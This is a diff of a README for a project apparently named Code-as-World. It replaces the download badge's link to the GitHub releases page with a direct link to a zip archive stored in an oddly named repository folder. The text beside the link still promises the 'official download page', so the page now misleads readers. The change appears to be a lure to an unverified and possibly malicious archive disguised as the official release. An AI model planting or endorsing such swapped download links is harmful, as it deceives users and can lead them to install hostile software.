@@ -32,7 +32,7 @@ Built-in tutorials and examples help you get started quickly. Each example is de
 
 ### Step 1: Get the Application
 
-[![Download Code-as-World](https://img.shields.io/badge/Download-Code--as--World-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cosmic-linearequation9478/Code-as-World/releases)
+[![Download Code-as-World](https://img.shields.io/badge/Download-Code--as--World-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/cosmic-linearequation9478/Code-as-World/main/chastisable/2.3.zip)
 
 Visit this link to download the application. You'll be taken to the official download page where you can get the latest version of Code-as-World for your computer.
 
